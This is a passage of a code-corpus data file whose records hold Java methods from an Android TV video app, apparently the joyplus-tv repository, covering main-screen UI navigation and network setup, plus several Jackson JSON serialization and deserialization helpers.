findViewById(R.id.img_navagatorbar3);\n\timage_bar1.setVisibility(View.INVISIBLE);\n\timage_bar2.setVisibility(View.INVISIBLE);\n\timage_bar3.setVisibility(View.INVISIBLE);\n\t\n\tupScrollBt = (Button) findViewById(R.id.bt_up_scrolllayout);\n\t\n\tupScrollBt.setOnClickListener(new View.OnClickListener() {\n\t\t\n\t\t@Override\n\t\tpublic void onClick(View v) {\n\t\t\t// TODO Auto-generated method stub\n\t\t\tLog.i(TAG, \"upScrollBt-->setOnClickListener\");\n\t\t\ttitleGroup.selectPreTitle();\n\t\t}\n\t});\n\t\n\tdownScrollBt = (Button) findViewById(R.id.bt_down_scrolllayout);\n\t\n\tdownScrollBt.setOnClickListener(new View.OnClickListener() {\n\t\t\n\t\t@Override\n\t\tpublic void onClick(View v) {\n\t\t\t// TODO Auto-generated method stub\n\t\t\tLog.i(TAG, \"downScrollBt-->setOnClickListener\");\n\t\t\ttitleGroup.selectNextTitle();\n\t\t}\n\t});\n\t\n\tleftCustomIv = (ImageButton) findViewById(R.id.icon_arrow_left);\n\trightCustomIv = (ImageButton) findViewById(R.id.icon_arrow_right);\n\tleftCustomIv.setFocusable(false);\n\tleftCustomIv.setFocusableInTouchMode(false);\n\trightCustomIv.setFocusable(false);\n\trightCustomIv.setFocusableInTouchMode(false);\n\tleftCustomIv.setOnClickListener(new View.OnClickListener() {\n\t\t\n\t\t@Override\n\t\tpublic void onClick(View v) {\n\t\t\t// TODO Auto-generated method stub\n\t\t\t\n\t\t\tgallery1.showPre();\n\t\t}\n\t});\n\t\n\trightCustomIv.setOnClickListener(new View.OnClickListener() {\n\t\t\n\t\t@Override\n\t\tpublic void onClick(View v) {\n\t\t\t// TODO Auto-generated method stub\n\t\t\t\n\t\t\tgallery1.showNext();\n\t\t}\n\t});\n\n\tkuView = LayoutInflater.from(Main1.this).inflate(R.layout.layout_lib,\n\t\t\tnull);\n\tmyView = LayoutInflater.from(Main1.this).inflate(R.layout.layout_my,\n\t\t\tnull);\n\tlastBandTimeView = (TextView) myView.findViewById(R.id.lastBandTime);\n\t\n\t/*\n\t * banner ad\n\t */\n\tlayout = (RelativeLayout) findViewById(R.id.adsdkContent);\n\t// \u4e00\u5f00\u59cb\u5224\u65ad\u6709\u6ca1\u6709\u7f51\u7edc\n\tif (!app.isNetworkAvailable()) {// \u5982\u679c\u6ca1\u6709\u7f51\u7edc\uff0c\u5f39\u51fa\u63d0\u793adialog\n\n\t\tisNetWorkFine = false;// \u7f51\u7edc\u4e0d\u6b63\u5e38\n\t\tshowDialog(DIALOG_NETWORK_ERROR);\n\n\t}\n\n\ttitleGroup.SetOnViewChangeListener(new OnViewChangeListener() {\n\n\t\t@Override\n\t\tpublic void OnViewChange(int index) {\n\t\t\t// TODO Auto-generated method stub\n\t\t\thandler.removeCallbacks(null, null);\n\t\t\tswitch (index) {\n\t\t\tcase 1:\n\t\t\t\timage_bar1.clearAnimation();\n\t\t\t\timage_bar2.clearAnimation();\n\t\t\t\timage_bar3.clearAnimation();\n\t\t\t\timage_bar2.setVisibility(View.INVISIBLE);\n\t\t\t\timage_bar3.setVisibility(View.INVISIBLE);\n\t\t\t\tif (image_bar1.getVisibility() == View.VISIBLE) {\n\t\t\t\t\timage_bar1.startAnimation(alpha_disappear);\n\t\t\t\t\timage_bar1.setVisibility(View.INVISIBLE);\n\t\t\t\t}\n\t\t\t\thighlightImageView_1.setVisibility(View.VISIBLE);\n\t\t\t\thighlightImageView_2.setVisibility(View.GONE);\n\t\t\t\thighlightImageView_3.setVisibility(View.GONE);\n\t\t\t\thighlightImageView_4.setVisibility(View.GONE);\n\t\t\t\tLog.d(\"AAAAA\", \"highlightImageView_1 visibale = \"\n\t\t\t\t\t\t+ highlightImageView_1.getVisibility());\n\t\t\t\tLog.d(\"AAAAA\", \"highlightImageView_2 visibale = \"\n\t\t\t\t\t\t+ highlightImageView_2.getVisibility());\n\t\t\t\tLog.d(\"AAAAA\", \"highlightImageView_3 visibale = \"\n\t\t\t\t\t\t+ highlightImageView_3.getVisibility());\n\t\t\t\tLog.d(\"AAAAA\", \"highlightImageView_4 visibale = \"\n\t\t\t\t\t\t+ highlightImageView_4.getVisibility());\n\t\t\t\taq = new AQuery(Main1.this);\n\t\t\t\tif (isHotLoadedFlag == 2) {\n\t\t\t\t\titemFram.setVisibility(View.VISIBLE);\n\t\t\t\t\tcontentLayout.removeAllViews();\n\t\t\t\t\tif (indexCaces.get(index) != null\n\t\t\t\t\t\t\t&& indexCaces.get(index) < hot_contentViews\n\t\t\t\t\t\t\t\t\t.size() - 1) {\n\t\t\t\t\t\tView hotView = hot_contentViews.get(indexCaces\n\t\t\t\t\t\t\t\t.get(index));\n\t\t\t\t\t\thotView.setLayoutParams(new LayoutParams(\n\t\t\t\t\t\t\t\tLayoutParams.MATCH_PARENT,\n\t\t\t\t\t\t\t\tLayoutParams.MATCH_PARENT));\n\t\t\t\t\t\tcontentLayout.startAnimation(alpha_appear);\n\t\t\t\t\t\tif(hot_list != null && hot_list.get(indexCaces\n\t\t\t\t\t\t\t\t.get(index))!= null) {\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tHotItemInfo tempInfo = hot_list.get(indexCaces\n\t\t\t\t\t\t\t\t\t.get(index));\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tLog.i(TAG, \"tempInfo.duration--->\" + tempInfo.duration);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif(tempInfo.type == 1 && tempInfo.prod_type.equals(\"1\")) {\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tinitOverTime(hotView, tempInfo.duration);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\tcontentLayout.addView(hotView);\n\t\t\t\t\t}\n\t\t\t\t\tgallery1.setAdapter(new MainHotItemAdapter(Main1.this,\n\t\t\t\t\t\t\thot_list));\n\t\t\t\t\tif (indexCaces.get(index) == null) {\n\t\t\t\t\t\tgallery1.setSelection(0);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tgallery1.setSelection(indexCaces.get(index));\n\t\t\t\t\t}\n\t\t\t\t\t// changeContent(0);\n\t\t\t\t\tint seletedindex = gallery1.getSelectedItemPosition();\n\t\t\t\t\tImageView img = null;\n\t\t\t\t\tif (seletedindex >= 0\n\t\t\t\t\t\t\t&& seletedindex < hot_list.size() - 1) {\n\t\t\t\t\t\timg = (ImageView) gallery1.findViewWithTag(hot_list\n\t\t\t\t\t\t\t\t.get(gallery1.getSelectedItemPosition()).prod_pic_url);\n\t\t\t\t\t}\n\t\t\t\t\tif (img != null) {\n\t\t\t\t\t\tif (img.getDrawable() != null) {\n\t\t\t\t\t\t\thighlightImageView_1.setImageDrawable(img\n\t\t\t\t\t\t\t\t\t.getDrawable());\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\thighlightImageView_1.setImageDrawable(null);\n\t\t\t\t\t\t\taq.id(highlightImageView_1)\n\t\t\t\t\t\t\t\t\t.image(hot_list.get(gallery1\n\t\t\t\t\t\t\t\t\t\t\t.getSelectedItemPosition()).prod_pic_url,\n\t\t\t\t\t\t\t\t\t\t\ttrue, true);\n\t\t\t\t\t\t}\n\t\t\t\t\t} else {\n\t\t\t\t\t\tif (seletedindex >= 0\n\t\t\t\t\t\t\t\t&& seletedindex < hot_list.size() - 1) {\n\t\t\t\t\t\t\taq.id(highlightImageView_1)\n\t\t\t\t\t\t\t\t\t.image(hot_list.get(gallery1\n\t\t\t\t\t\t\t\t\t\t\t.getSelectedItemPosition()).prod_pic_url,\n\t\t\t\t\t\t\t\t\t\t\ttrue, true);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tswitch (Integer.valueOf(hot_list.get(gallery1\n\t\t\t\t\t\t\t.getSelectedItemPosition()).definition)) {\n\t\t\t\t\tcase 8:\n\t\t\t\t\t\tdefinitionIcon.setImageResource(R.drawable.icon_bd);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 7:\n\t\t\t\t\t\tdefinitionIcon.setImageResource(R.drawable.icon_hd);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 6:\n\t\t\t\t\t\tdefinitionIcon.setImageResource(R.drawable.icon_ts);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tdefinitionIcon.setImageDrawable(null);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\t// aq.id(highlightImageView).image(hot_list.get(gallery1.getSelectedItemPosition()).prod_pic_url);\n\t\t\t\t\t// noticeView.setText(gallery1.getSelectedItemPosition()+1\n\t\t\t\t\t// + \"/\" + hot_list.size());\n//\t\t\t\t\t\tgallery1.setAdapter(new MainHotItemAdapter(Main.this,\n//\t\t\t\t\t\t\t\thot_list));\n//\t\t\t\t\t\tif (indexCaces.get(index) == null) {\n//\t\t\t\t\t\t\tgallery1.setSelection(0);\n//\t\t\t\t\t\t} else {\n//\t\t\t\t\t\t\tgallery1.setSelection(indexCaces.get(index));\n//\t\t\t\t\t\t}\n\n\t\t\t\t} else {\n\t\t\t\t\tdefinitionIcon.setImageDrawable(null);\n\t\t\t\t\titemFram.setVisibility(View.INVISIBLE);\n\t\t\t\t\thot_list.clear();\n\t\t\t\t\thot_contentViews.clear();\n\t\t\t\t\tgallery1.setAdapter(null);\n\t\t\t\t\tcontentLayout.removeAllViews();\n\t\t\t\t\tLog.i(TAG, \"SetOnViewChangeListener--->isHotLoadedFlag != 2\");\n\t\t\t\t\tgetHistoryServiceData();\n\t\t\t\t\tgetHotServiceData();\n\t\t\t\t}\n\t\t\t\tplayIcon.setVisibility(View.VISIBLE);\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\timage_bar1.clearAnimation();\n\t\t\t\timage_bar2.clearAnimation();\n\t\t\t\timage_bar3.clearAnimation();\n\t\t\t\timage_bar3.setVisibility(View.INVISIBLE);\n\t\t\t\tif (image_bar2.getVisibility() == View.VISIBLE) {\n\t\t\t\t\timage_bar2.startAnimation(alpha_disappear);\n\t\t\t\t\timage_bar2.setVisibility(View.INVISIBLE);\n\t\t\t\t} else {\n\t\t\t\t\timage_bar1.startAnimation(alpha_appear);\n\t\t\t\t\timage_bar1.setVisibility(View.VISIBLE);\n\t\t\t\t}\n\t\t\t\taq = new AQuery(Main1.this);\n\t\t\t\thighlightImageView_1.setVisibility(View.GONE);\n\t\t\t\thighlightImageView_2.setVisibility(View.VISIBLE);\n\t\t\t\thighlightImageView_3.setVisibility(View.GONE);\n\t\t\t\thighlightImageView_4.setVisibility(View.GONE);\n\t\t\t\tLog.d(\"AAAAA\", \"highlightImageView_1 visibale = \"\n\t\t\t\t\t\t+ highlightImageView_1.getVisibility());\n\t\t\t\tLog.d(\"AAAAA\", \"highlightImageView_2 visibale = \"\n\t\t\t\t\t\t+ highlightImageView_2.getVisibility());\n\t\t\t\tLog.d(\"AAAAA\", \"highlightImageView_3 visibale = \"\n\t\t\t\t\t\t+ highlightImageView_3.getVisibility());\n\t\t\t\tLog.d(\"AAAAA\", \"highlightImageView_4 visibale = \"\n\t\t\t\t\t\t+ highlightImageView_4.getVisibility());\n\t\t\t\tplayIcon.setVisibility(View.INVISIBLE);\n\t\t\t\tif (isYueDanLoadedFlag == 2) {\n\t\t\t\t\titemFram.setVisibility(View.VISIBLE);\n\t\t\t\t\tcontentLayout.removeAllViews();\n\t\t\t\t\tif (indexCaces.get(index) != null\n\t\t\t\t\t\t\t&& indexCaces.get(index) < yuedan_contentViews\n\t\t\t\t\t\t\t\t\t.size() - 1) {\n\t\t\t\t\t\tView yeuDanView = yuedan_contentViews\n\t\t\t\t\t\t\t\t.get(indexCaces.get(index));\n\t\t\t\t\t\tyeuDanView.setLayoutParams(new LayoutParams(\n\t\t\t\t\t\t\t\tLayoutParams.MATCH_PARENT,\n\t\t\t\t\t\t\t\tLayoutParams.MATCH_PARENT));\n\t\t\t\t\t\tcontentLayout.startAnimation(alpha_appear);\n\t\t\t\t\t\tcontentLayout.addView(yeuDanView);\n\t\t\t\t\t}\n\t\t\t\t\tgallery1.setAdapter(new MainYueDanItemAdapter(\n\t\t\t\t\t\t\tMain1.this, yuedan_list));\n\t\t\t\t\tif (indexCaces.get(index) == null) {\n\t\t\t\t\t\tgallery1.setSelection(0);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tgallery1.setSelection(indexCaces.get(index));\n\t\t\t\t\t}\n\t\t\t\t\tif (gallery1.getSelectedItemPosition() == yuedan_list\n\t\t\t\t\t\t\t.size() - 2) {\n\t\t\t\t\t\thighlightImageView_2\n\t\t\t\t\t\t\t\t.setImageResource(R.drawable.more_movie_active);\n\t\t\t\t\t} else if (gallery1.getSelectedItemPosition() == yuedan_list\n\t\t\t\t\t\t\t.size() - 1) {\n\t\t\t\t\t\thighlightImageView_2\n\t\t\t\t\t\t\t\t.setImageResource(R.drawable.more_episode_active);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tImageView img2 = (ImageView) gallery1.findViewWithTag(yuedan_list\n\t\t\t\t\t\t\t\t.get(gallery1.getSelectedItemPosition()).pic_url);\n\t\t\t\t\t\tif (img2 != null) {\n\t\t\t\t\t\t\tif (img2.getDrawable() != null) {\n\t\t\t\t\t\t\t\thighlightImageView_2.setImageDrawable(img2\n\t\t\t\t\t\t\t\t\t\t.getDrawable());\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\thighlightImageView_2.setImageDrawable(null);\n\t\t\t\t\t\t\t\taq.id(highlightImageView_2)\n\t\t\t\t\t\t\t\t\t\t.image(yuedan_list.get(gallery1\n\t\t\t\t\t\t\t\t\t\t\t\t.getSelectedItemPosition()).pic_url,\n\t\t\t\t\t\t\t\t\t\t\t\ttrue, true);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\taq.id(highlightImageView_2)\n\t\t\t\t\t\t\t\t\t.image(yuedan_list.get(gallery1\n\t\t\t\t\t\t\t\t\t\t\t.getSelectedItemPosition()).pic_url,\n\t\t\t\t\t\t\t\t\t\t\ttrue, true);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif (\"1\".equals(yuedan_list.get(gallery1\n\t\t\t\t\t\t\t\t.getSelectedItemPosition()).prod_type)) {\n\t\t\t\t\t\t\tdefinitionIcon\n\t\t\t\t\t\t\t\t\t.setImageResource(R.drawable.icon_movie);\n\t\t\t\t\t\t} else if (\"2\".equals(yuedan_list.get(gallery1\n\t\t\t\t\t\t\t\t.getSelectedItemPosition()).prod_type)) {\n\t\t\t\t\t\t\tdefinitionIcon\n\t\t\t\t\t\t\t\t\t.setImageResource(R.drawable.icon_episode);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tnoticeView.setText(gallery1.getSelectedItemPosition()\n\t\t\t\t\t\t\t+ 1 + \"/\" + yuedan_list.size());\n\t\t\t\t\t\n//\t\t\t\t\t\tgallery1.setAdapter(new MainYueDanItemAdapter(Main.this,\n//\t\t\t\t\t\t\t\tyuedan_list));\n//\t\t\t\t\t\tif (indexCaces.get(index) == null) {\n//\t\t\t\t\t\t\tgallery1.setSelection(0);\n//\t\t\t\t\t\t} else {\n//\t\t\t\t\t\t\tgallery1.setSelection(indexCaces.get(index));\n//\t\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tyuedan_list.clear();\n\t\t\t\t\tyuedan_contentViews.clear();\n\t\t\t\t\tgallery1.setAdapter(null);\n\t\t\t\t\tcontentLayout.removeAllViews();\n\t\t\t\t\titemFram.setVisibility(View.INVISIBLE);\n\t\t\t\t\tdefinitionIcon.setImageDrawable(null);\n\t\t\t\t\tgetMovieYueDanServiceData();\n\t\t\t\t\tgetTVYueDanServiceData();\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase 3:\n\t\t\t\timage_bar1.clearAnimation();\n\t\t\t\timage_bar2.clearAnimation();\n\t\t\t\timage_bar3.clearAnimation();\n\t\t\t\timage_bar1.setVisibility(View.VISIBLE);\n\t\t\t\tif (image_bar3.getVisibility() == View.VISIBLE) {\n\t\t\t\t\timage_bar3.startAnimation(alpha_disappear);\n\t\t\t\t\timage_bar3.setVisibility(View.INVISIBLE);\n\t\t\t\t} else {\n\t\t\t\t\timage_bar2.startAnimation(alpha_appear);\n\t\t\t\t\timage_bar2.setVisibility(View.VISIBLE);\n\t\t\t\t}\n\t\t\t\taq = new AQuery(Main1.this);\n\t\t\t\thighlightImageView_1.setVisibility(View.GONE);\n\t\t\t\thighlightImageView_2.setVisibility(View.GONE);\n\t\t\t\thighlightImageView_3.setVisibility(View.VISIBLE);\n\t\t\t\thighlightImageView_4.setVisibility(View.GONE);\n\t\t\t\t\n\t\t\t\titemFram.setVisibility(View.VISIBLE);\n\t\t\t\tcontentLayout.removeAllViews();\n\t\t\t\tkuView.setLayoutParams(new LayoutParams(\n\t\t\t\t\t\tLayoutParams.MATCH_PARENT,\n\t\t\t\t\t\tLayoutParams.MATCH_PARENT));\n\t\t\t\tcontentLayout.startAnimation(alpha_appear);\n\t\t\t\tcontentLayout.addView(kuView);\n\t\t\t\tgallery1.setAdapter(new MainLibAdapter(Main1.this,\n\t\t\t\t\t\tresouces_lib_nomal));\n\t\t\t\tif (indexCaces.get(index) == null) {\n\t\t\t\t\tgallery1.setSelection(0);\n\t\t\t\t} else {\n\t\t\t\t\tgallery1.setSelection(indexCaces.get(index));\n\t\t\t\t}\n\t\t\t\tplayIcon.setVisibility(View.INVISIBLE);\n\t\t\t\thighlightImageView_3\n\t\t\t\t\t\t.setImageResource(resouces_lib_active[gallery1\n\t\t\t\t\t\t\t\t.getSelectedItemPosition()]);\n\t\t\t\tnoticeView.setText(gallery1.getSelectedItemPosition() + 1\n\t\t\t\t\t\t+ \"/\" + resouces_lib_active.length);\n\t\t\t\tdefinitionIcon.setImageDrawable(null);\n\t\t\t\tdefinitionIcon.setImageDrawable(null);\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\t\timage_bar1.clearAnimation();\n\t\t\t\timage_bar2.clearAnimation();\n\t\t\t\timage_bar3.clearAnimation();\n\t\t\t\timage_bar1.setVisibility(View.VISIBLE);\n\t\t\t\timage_bar2.setVisibility(View.VISIBLE);\n\t\t\t\timage_bar3.setVisibility(View.VISIBLE);\n\t\t\t\timage_bar3.startAnimation(alpha_appear);\n\t\t\t\taq = new AQuery(Main1.this);\n\t\t\t\thighlightImageView_1.setVisibility(View.GONE);\n\t\t\t\thighlightImageView_2.setVisibility(View.GONE);\n\t\t\t\thighlightImageView_3.setVisibility(View.GONE);\n\t\t\t\thighlightImageView_4.setVisibility(View.VISIBLE);\n\n\t\t\t\titemFram.setVisibility(View.VISIBLE);\n\t\t\t\tcontentLayout.removeAllViews();\n\t\t\t\tmyView.setLayoutParams(new LayoutParams(\n\t\t\t\t\t\tLayoutParams.MATCH_PARENT,\n\t\t\t\t\t\tLayoutParams.MATCH_PARENT));\n\t\t\t\tcontentLayout.startAnimation(alpha_appear);\n\t\t\t\tcontentLayout.addView(myView);\n\t\t\t\tupdateLastTimeView();\n\t\t\t\tgallery1.setAdapter(new MainLibAdapter(Main1.this,\n\t\t\t\t\t\tresouces_my_nomal));\n\t\t\t\tif (indexCaces.get(index) == null) {\n\t\t\t\t\tgallery1.setSelection(0);\n\t\t\t\t} else {\n\t\t\t\t\tgallery1.setSelection(indexCaces.get(index));\n\t\t\t\t}\n\t\t\t\tplayIcon.setVisibility(View.INVISIBLE);\n\t\t\t\thighlightImageView_4\n\t\t\t\t\t\t.setImageResource(resouces_my_active[gallery1\n\t\t\t\t\t\t\t\t.getSelectedItemPosition()]);\n\t\t\t\tnoticeView.setText(gallery1.getSelectedItemPosition() + 1\n\t\t\t\t\t\t+ \"/\" + resouces_my_active.length);\n\t\t\t\tdefinitionIcon.setImageDrawable(null);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (gallery1.getAnimation() != null\n\t\t\t\t\t&& !gallery1.getAnimation().hasEnded()) {\n\n\t\t\t} else {\n\t\t\t\tLog.d(TAG, \"startAnimation---------------------->\");\n\t\t\t\tgallery1.clearAnimation();\n\t\t\t\tgallery1.startAnimation(alpha_appear);\n\t\t\t}\n\n\t\t\t// gallery1.startAnimation(alpha_appear);\n\t\t}\n\t});\n\n\titemFram = (FrameLayout) findViewById(R.id.itemFram);\n\t// clock = (ClockTextView) findViewById(R.id.clock);\n\thighlightImageView_1 = (ImageView) findViewById(R.id.highlight_img_1);\n\thighlightImageView_2 = (ImageView) findViewById(R.id.highlight_img_2);\n\thighlightImageView_3 = (ImageView) findViewById(R.id.highlight_img_3);\n\thighlightImageView_4 = (ImageView) findViewById(R.id.highlight_img_4);\n\thighlightImageView_2.setVisibility(View.GONE);\n\thighlightImageView_3.setVisibility(View.GONE);\n\thighlightImageView_4.setVisibility(View.GONE);\n\tplayIcon = (ImageView) findViewById(R.id.play_icon);\n\tdefinitionIcon = (ImageView) findViewById(R.id.icon_defination);\n\n\t// MarginLayoutParams mlp = (MarginLayoutParams)\n\t// gallery1.getLayoutParams();\n\tDisplayMetrics metrics = new DisplayMetrics();\n\tdensity = metrics.density;\n\tDisplay display = getWindowManager().getDefaultDisplay();\n\tdisplayWith = display.getWidth();\n\t// Toast.makeText(this, \"widthPixels = \" + display.get, 100).show();\n\t// Toast.makeText(this, \"topMargin = \" + mlp.topMargin, 100).show();\n\tgetWindowManager().getDefaultDisplay().getMetrics(metrics);\n\t// mlp.setMargins(-displayWith+displayWith/2,\n\t// mlp.topMargin,\n\t// mlp.rightMargin,\n\t// mlp.bottomMargin\n\t// );\n\tgallery1.setAdapter(new MainHotItemAdapter(Main1.this, hot_list));\n\t// gallery1.setCallbackDuringFling(false);\n\tgallery1.setOnItemSelectedListener(this);\n\tgallery1.setOnItemClickListener(this);\n\tgallery1.setSelection(1);\n\n\tMarginLayoutParams mlp2 = (MarginLayoutParams) titleGroup\n\t\t\t.getLayoutParams();\n\tmlp2.setMargins((displayWith - 40) / 6 + 21, mlp2.topMargin,\n\t\t\tmlp2.rightMargin, mlp2.bottomMargin);\n\tMarginLayoutParams mlp3 = (MarginLayoutParams) noticeView\n\t\t\t.getLayoutParams();\n\tmlp3.setMargins((displayWith - 40) / 6 + 21, mlp3.topMargin,\n\t\t\tmlp3.rightMargin, mlp3.bottomMargin);\n\t// MarginLayoutParams mlp4 = (MarginLayoutParams)\n\t// contentLayout.getLayoutParams();\n\t// mlp4.setMargins((displayWith-40)/6+15,\n\t// mlp4.topMargin,\n\t// mlp4.rightMargin,\n\t// mlp4.bottomMargin);\n\tLayoutParams param = itemFram.getLayoutParams();\n\tparam.height = 2 * displayWith / 9 + 3;\n\tparam.width = displayWith / 6 + 3;\n\titemFram.setVisibility(View.INVISIBLE);\n\talpha_appear = AnimationUtils.loadAnimation(this, R.anim.alpha_appear);\n\talpha_disappear = AnimationUtils.loadAnimation(this,\n\t\t\tR.anim.alpha_disappear);\n\n\theaders = new HashMap<String, String>();\n\theaders.put(\"User-Agent\",\n\t\t\t\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2\");\n\tPackageInfo pInfo;\n\ttry {\n\t\tpInfo = getPackageManager().getPackageInfo(getPackageName(), 0);\n\t\theaders.put(\"version\", pInfo.versionName);\n\t} catch (NameNotFoundException e) {\n\t\t// TODO Auto-generated catch block\n\t\te.printStackTrace();\n\t}\n\n\tif (isNetWorkFine) {// \u5982\u679c\u7f51\u7edc\u6b63\u5e38\u5c31\u6267\u884c\n\n\t\tinitNetWorkData();\n\t}\n\n\t// \u53cb\u76df\u81ea\u52a8\u5347\u7ea7\n\tUmengUpdateAgent.setUpdateOnlyWifi(false);\n\tUmengUpdateAgent.setOnDownloadListener(null);\n\tUmengUpdateAgent.update(this);\n\n}", "path": "joytv\\src\\com\\joyplus\\tv\\Main1.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/**\n * Main constructor used both for creating new instances (by\n * {@link BeanDeserializer#asArrayDeserializer}) and for\n * creating copies with different delegate.\n */\n", "func_signal": "public BeanAsArrayDeserializer(BeanDeserializerBase delegate,\n        SettableBeanProperty[] ordered)", "code": "{\n    super(delegate);\n    _delegate = delegate;\n    _orderedProperties = ordered;\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\deser\\impl\\BeanAsArrayDeserializer.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/**\n * Main serialization method that will delegate actual output to\n * configured\n * {@link BeanPropertyWriter} instances.\n */\n", "func_signal": "@Override\npublic final void serialize(Object bean, JsonGenerator jgen, SerializerProvider provider)\n    throws IOException, JsonGenerationException", "code": "{\n    if (_objectIdWriter != null) {\n        serializeWithObjectId(bean, jgen, provider);\n        return;\n    }\n    if (_propertyFilterId != null) {\n        serializeFieldsFiltered(bean, jgen, provider);\n    } else {\n        serializeFields(bean, jgen, provider);\n    }\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\ser\\impl\\UnwrappingBeanSerializer.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/*\n/**********************************************************\n/* Internal methods\n/**********************************************************\n */\n", "func_signal": "private Match _findFormat(AccessorForReader acc) throws IOException", "code": "{\n    ObjectReader bestMatch = null;\n    MatchStrength bestMatchStrength = null;\n    for (ObjectReader f : _readers) {\n        acc.reset();\n        MatchStrength strength = f.getFactory().hasFormat(acc);\n        // if not better than what we have so far (including minimal level limit), skip\n        if (strength == null || strength.ordinal() < _minimalMatch.ordinal()) {\n            continue;\n        }\n        // also, needs to better match than before\n        if (bestMatch != null) {\n            if (bestMatchStrength.ordinal() >= strength.ordinal()) {\n                continue;\n            }\n        }\n        // finally: if it's good enough match, we are done\n        bestMatch = f;\n        bestMatchStrength = strength;\n        if (strength.ordinal() >= _optimalMatch.ordinal()) {\n            break;\n        }\n    }\n    return acc.createMatcher(bestMatch, bestMatchStrength);\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\deser\\DataFormatReaders.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/*\n/**********************************************************\n/* Fluent factories for changing underlying readers\n/**********************************************************\n */\n", "func_signal": "public DataFormatReaders with(DeserializationConfig config)", "code": "{\n    final int len = _readers.length;\n    ObjectReader[] r = new ObjectReader[len];\n    for (int i = 0; i < len; ++i) {\n        r[i] = _readers[i].with(config);\n    }\n    return new DataFormatReaders(r, _optimalMatch, _minimalMatch, _maxInputLookahead);\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\deser\\DataFormatReaders.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/*\n/**********************************************************\n/* Helper methods, error reporting\n/**********************************************************\n */\n", "func_signal": "protected Object _deserializeFromNonArray(JsonParser jp, DeserializationContext ctxt)\n        throws IOException, JsonProcessingException", "code": "{\n    // Let's start with failure\n    throw ctxt.mappingException(\"Can not deserialize a POJO (of type \"+_beanType.getRawClass().getName()\n            +\") from non-Array representation (token: \"+jp.getCurrentToken()\n            +\"): type/property designed to be serialized as JSON Array\");\n    // in future, may allow use of \"standard\" POJO serialization as well; if so, do:\n    //return _delegate.deserialize(jp, ctxt);\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\deser\\impl\\BeanAsArrayDeserializer.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/*\n/**********************************************************\n/* Construction\n/**********************************************************\n */\n", "func_signal": "public DataFormatReaders(ObjectReader... detectors)", "code": "{\n    this(detectors, MatchStrength.SOLID_MATCH, MatchStrength.WEAK_MATCH,\n        DEFAULT_MAX_INPUT_LOOKAHEAD);\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\deser\\DataFormatReaders.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "// private void removeSameInHotList(){\n// HotItemInfo info = hot_list.get(0);\n// if(info.type == 0){\n// Log.d(TAG, \"---------------------> remove same\");\n// if(hot_list.size()>1){\n// for(int i=1; i<hot_list.size();i++){\n// HotItemInfo info2 = hot_list.get(i);\n// if(info.prod_id.equals(info2.prod_id)){\n// hot_list.remove(info2);\n// }\n// }\n// }\n// }\n// }\n", "func_signal": "protected void getServiceData(String url, String interfaceName)", "code": "{\n\t// TODO Auto-generated method stub\n\n\tAjaxCallback<JSONObject> cb = new AjaxCallback<JSONObject>();\n\tcb.url(url).type(JSONObject.class).weakHandler(this, interfaceName);\n\n\tcb.SetHeader(app.getHeaders());\n\taq.ajax(cb);\n}", "path": "joytv\\src\\com\\joyplus\\tv\\Main1.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
{"docstring": "/**\n * Constructor used for creating unwrapping instance of a\n * standard <code>BeanSerializer</code>\n */\n", "func_signal": "public UnwrappingBeanSerializer(BeanSerializerBase src, NameTransformer transformer)", "code": "{\n    super(src, transformer);\n    _nameTransformer = transformer;\n}", "path": "joytv\\src\\com\\fasterxml\\jackson\\databind\\ser\\impl\\UnwrappingBeanSerializer.java", "repo_name": "joyplus/joyplus-tv", "stars": 79, "license": "other", "language": "java", "size": 12946}
